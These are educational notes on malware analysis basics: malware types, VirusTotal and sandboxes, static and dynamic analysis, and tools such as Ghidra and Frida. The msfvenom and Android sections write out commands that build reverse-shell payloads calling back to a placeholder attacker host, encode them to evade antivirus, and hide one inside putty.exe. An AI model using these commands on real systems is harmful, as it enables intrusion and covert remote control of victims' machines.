# Malware Analysis & Reverse Engineering Basics

**Malware Analysis** is the process of studying a malware sample to understand its origin, functionality, potential impact, and indicators of compromise (IOCs). The goal is often to develop defenses against it or understand an attacker's methods.

**Reverse Engineering** in this context often refers to the deeper analysis of malware, disassembling or decompiling its code to understand its exact algorithms, logic, and hidden capabilities.

## Types of malware (Viruses, Trojans, Worms, Rootkits)

Malware (Malicious Software) comes in various forms, often categorized by how they spread or what they do. Here are some common types:

*   **Virus:**
    *   **Definition:** A piece of malicious code that attaches itself to legitimate programs or files (the host).
    *   **Replication:** Requires human interaction (e.g., running the infected program) to execute and spread to other files/programs.
    *   **Payload:** Can range from harmless messages to data destruction or system compromise.
    *   **Examples:** File infectors, macro viruses, boot sector viruses.

*   **Trojan (Trojan Horse):**
    *   **Definition:** Malware disguised as legitimate or desirable software. It tricks users into installing and running it.
    *   **Replication:** Does not self-replicate like viruses or worms. Relies on social engineering or deception for distribution.
    *   **Payload:** Varies widely; often creates a backdoor for remote access, steals data (passwords, financial info), installs other malware (dropper), or performs destructive actions.
    *   **Examples:** Remote Access Trojans (RATs - providing remote control), banking trojans, downloader trojans, fake antivirus software.

*   **Worm:**
    *   **Definition:** Standalone malware that replicates itself to spread to other computers, typically over a network.
    *   **Replication:** Exploits vulnerabilities in operating systems or applications to spread automatically without human interaction.
    *   **Payload:** Can carry destructive payloads, install backdoors, or create botnets. The primary goal is often rapid propagation.
    *   **Examples:** SQL Slammer, Conficker, WannaCry (which also had ransomware components).

*   **Rootkit:**
    *   **Definition:** Malware designed to gain administrative-level control (root access) over a computer system while hiding its own presence (and often other malware).
    *   **Function:** Modifies the core operating system components (kernel, APIs) or firmware to conceal processes, files, network connections, and registry keys from the user and security software.
    *   **Purpose:** Enables stealthy persistence for other malware or attackers.
    *   **Examples:** Kernel-level rootkits, user-mode rootkits, bootkits (infecting the boot process), firmware rootkits.

*   **Other Common Types:**
    *   **Ransomware:** Encrypts victim's files and demands payment for the decryption key.
    *   **Spyware:** Secretly monitors user activity and collects information (keystrokes, browsing habits, credentials).
    *   **Adware:** Displays unwanted advertisements, often bundled with free software.
    *   **Botnet Malware:** Turns compromised computers into "bots" controlled remotely by an attacker (Botmaster) for activities like DDoS attacks or spamming.

## Hands-on: Using VirusTotal & sandboxes for malware analysis

Practical malware analysis often starts with basic static and dynamic analysis techniques using readily available tools.

*   **VirusTotal (VT):** ([https://www.virustotal.com/](https://www.virustotal.com/))
    *   **What it is:** A free online service (owned by Google) that analyzes files and URLs using a vast collection of antivirus engines, website scanners, and other tools.
    *   **How it's used (Basic Static Analysis):**
        *   **Upload Sample:** Submit a suspicious file (or its hash - MD5, SHA1, SHA256) or URL.
        *   **Check Detection Ratio:** See how many AV engines detect the sample as malicious. *Caution: A low detection rate doesn't mean it's safe, especially for new malware.*
        *   **Review Details:** Examine file metadata, hashes, embedded strings, packer information, and sometimes basic behavioral information if VT has sandboxed it previously.
        *   **Check Relationships:** Explore connections to other files, domains, IPs associated with the sample.
        *   **Check Community Comments:** Often contains useful insights from other researchers.
    *   **Purpose:** Quick assessment of known threats, gathering initial IOCs (hashes, related domains/IPs), checking if a file is already widely known.
    *   **Limitations:** Not foolproof (evasion techniques exist), primarily static analysis (doesn't deeply analyze behavior unless previously sandboxed), submitting sensitive samples uploads them to VT.

*   **Sandboxes (Automated Dynamic Analysis):**
    *   **What they are:** Isolated environments (often virtual machines) designed to safely execute potentially malicious software and observe its behavior without affecting the host system or network.
    *   **How they are used:**
        *   **Submit Sample:** Upload the malware file to the sandbox service/system.
        *   **Execution & Monitoring:** The sandbox runs the malware and automatically monitors its actions:
            *   File system changes (files created, deleted, modified).
            *   Registry changes (keys created, deleted, modified).
            *   Processes created or injected into.
            *   Network connections attempted (DNS lookups, HTTP requests, C2 communication).
            *   API calls made.
        *   **Report Generation:** The sandbox produces a detailed report summarizing the observed behavior, extracted IOCs (IPs, domains, hashes of dropped files), and often assigns a threat score.
    *   **Purpose:** Understand the malware's actions, identify its capabilities (e.g., persistence mechanisms, data exfiltration methods), extract IOCs for detection rules (like Snort or YARA).
    *   **Examples:**
        *   **Online/Cloud Sandboxes:** Any.Run (interactive), Hybrid Analysis, Joe Sandbox Cloud, Intezer Analyze.
            *   Any.Run: [https://app.any.run/](https://app.any.run/)
            *   Hybrid Analysis: [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)
        *   **Local Sandbox Software:** Cuckoo Sandbox (open-source, requires setup), VMWare/VirtualBox with monitoring tools (manual sandbox).
    *   **Limitations:** Malware can detect sandbox environments (VM detection, tool detection) and alter its behavior or refuse to run (sandbox evasion). Analysis time is limited.

## Static vs. Dynamic Analysis

Malware analysis techniques generally fall into two categories:

*   **Static Analysis:** Examining the malware without actually executing it.
    *   **Goal:** Understand the code, structure, and potential capabilities by looking at strings, headers, metadata, imported functions, and disassembled/decompiled code.
    *   **Pros:** Safer (malware isn't running), can reveal functionality hidden from dynamic analysis (e.g., anti-VM code).
    *   **Cons:** Can be time-consuming, obfuscated/packed code can hinder analysis, doesn't show actual runtime behavior.
*   **Dynamic Analysis:** Executing the malware in a controlled environment (sandbox) to observe its behavior.
    *   **Goal:** See what the malware *does* - files it creates/modifies, registry changes, network connections, processes it launches.
    *   **Pros:** Reveals actual behavior, can be faster for understanding high-level actions, good for extracting IOCs.
    *   **Cons:** Risky if sandbox isn't properly isolated, malware might not exhibit all behaviors (sandbox evasion, specific triggers needed), some actions might be missed.

## Common Malware Analysis Tools & Environments

*   **Basic Static Tools:**
    *   `strings`: Extracts printable character sequences from files (useful for finding URLs, IPs, filenames, commands).
    *   File identification tools (`file` on Linux, PE viewers like PEStudio on Windows): Identify file type, architecture, packer info.
*   **Advanced Static Analysis / Reverse Engineering Tools:**
    *   **Disassemblers/Decompilers:**
        *   **Ghidra:** Free, powerful, multi-platform reverse engineering suite developed by the NSA.
        *   **IDA Pro:** Industry standard, very powerful disassembler and debugger (commercial).
        *   **radare2 / Cutter:** Open-source reverse engineering framework.
        *   **JADX-GUI:** Popular decompiler specifically for Android APK files.
*   **Dynamic Analysis Tools:**
    *   **Sandboxes:** (Covered above: Any.Run, Hybrid Analysis, Cuckoo, etc.)
    *   **Debuggers:** OllyDbg, x64dbg (Windows), GDB (Linux) - Allow step-by-step code execution and inspection of memory/registers.
    *   **Monitoring Tools:** Process Monitor (ProcMon), Process Explorer, RegShot, Wireshark - Used within a sandbox or carefully on a live system to track file system, registry, process, and network activity.
    *   **Dynamic Instrumentation:**
        *   **Frida:** Powerful toolkit to inject scripts into running processes to hook functions, intercept data, and modify behavior on the fly.
*   **Specialized Analysis Environments (VMs):**
    *   **Flare VM:** A Windows-based virtual machine distribution from Mandiant, pre-loaded with a wide array of analysis tools.
    *   **REMnux:** A Linux-based toolkit and distribution focused on malware analysis and reverse engineering.

## Notes on Android Malware (APK Files)

*   **Structure:** APK files are essentially ZIP archives containing application code (DEX files), resources, manifest file (permissions, components), etc.
*   **Analysis:** Often involves using tools like `JADX-GUI` to decompile DEX files back into Java-like code for static analysis. Dynamic analysis can be done using emulators or physical devices with tools like Frida.
*   **Creation Context (for understanding):** Tools like `msfvenom` (part of Metasploit Framework) can generate malicious APK payloads (e.g., `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o malicious.apk`). Understanding how they are created helps in identifying their components during analysis. Modified or created APKs often need to be re-signed using tools like `jarsigner` to be installable.

## msfvenom

**What it is:** `msfvenom` is a command-line tool that is part of the Metasploit Framework. It's essentially a combination of two older Metasploit tools: `msfpayload` (for generating shellcode/payloads) and `msfencode` (for encoding payloads to evade detection).

**Why it's used:**
*   **Payload Generation:** Its primary purpose is to create malicious payloads (like reverse shells, meterpreter sessions, command execution stagers) for various platforms (Windows, Linux, macOS, Android, etc.) and architectures.
*   **Encoding:** It can encode these payloads using different techniques to try and bypass antivirus software or intrusion detection systems.
*   **Output Formats:** It can output payloads in various formats suitable for different exploitation scenarios (e.g., raw shellcode, executable files, script formats like Python or Perl, APK files for Android).
*   **Template Insertion:** It can embed payloads into existing legitimate executable files (though this is often less reliable than custom packers).

**Relevance to Malware Analysis:** While `msfvenom` is an offensive tool used by penetration testers and attackers, understanding how it works is valuable for analysts. It helps in recognizing common payload structures (like Meterpreter stagers) and understanding how malicious executables or scripts might be generated, especially when dealing with common attack frameworks. The example in the Android section shows how it can create a malicious APK, and analyzing such a file requires knowing what components `msfvenom` likely included.

**Common Commands and Options:**
*   **List available items:**
    *   `msfvenom -l payloads` : List all available payloads.
    *   `msfvenom -l encoders` : List all available encoders.
    *   `msfvenom -l formats` : List all available output formats.
    *   `msfvenom -l platforms` : List supported target platforms.
    *   `msfvenom -l archs` : List supported architectures.
*   **Generate a payload:**
    *   `msfvenom -p <payload_name> [options] -f <format> -o <output_file>`
    *   *Example (Windows Reverse TCP Meterpreter):*
        `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe`
    *   *Example (Linux Reverse TCP Shell):*
        `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf -o reverse_shell`
    *   *Example (PHP Reverse TCP Shell for Web Server):*
        `msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw -o shell.php`
*   **Encoding a payload:**
    *   `msfvenom -p <payload> [options] -e <encoder> -i <iterations> -f <format> -o <output_file>`
    *   *Example (Encoded Windows Meterpreter):*
        `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe`
*   **Using a template (embedding payload):**
    *   `msfvenom -p <payload> [options] -x <template_executable> -f exe -o output_file.exe`
    *   *Example (Embed into putty.exe):*
        `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -x /usr/share/windows-resources/binaries/putty.exe -f exe -o infected_putty.exe`

## jarsigner

**What it is:** `jarsigner` is a command-line tool provided with the Java Development Kit (JDK).

**Why it's used:**
*   **Signing Archives:** Its primary purpose is to digitally sign Java Archive (`.jar`) files. Since Android Application Packages (`.apk` files) use the JAR format structure, `jarsigner` is used to sign APKs as well.
*   **Verification:** It can also be used to verify the signature of a signed JAR/APK file.

**How it Works:**
*   It uses a **keystore** (a repository of security certificates and private keys) to sign the archive.
*   The signing process attaches a digital signature to the archive, which includes information about the signer (using their public key certificate) and ensures the integrity of the archive's contents (verifying it hasn't been tampered with since signing).

**Relevance to Malware Analysis & Security:**
*   **Android Requirement:** Android requires all APKs to be digitally signed with a certificate before they can be installed on a device or updated. This signature verifies the application's author and ensures that updates come from the same author.
*   **Malicious APKs:** When attackers create or modify APK files (e.g., using `msfvenom` or by injecting code into legitimate apps), they **must** sign the resulting APK to make it installable.
*   **Self-Signed Certificates:** Attackers typically use self-generated (self-signed) certificates for signing, as they don't have access to legitimate developer certificates.
*   **Analysis Point:** While the signature itself might not always reveal much if it's self-signed with generic details, examining the signature is a standard step in APK analysis to confirm it exists and potentially gather any metadata included in the certificate.

**Common Usage (Signing):**
`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore <your_keystore_file> <apk_file_to_sign> <keystore_alias>`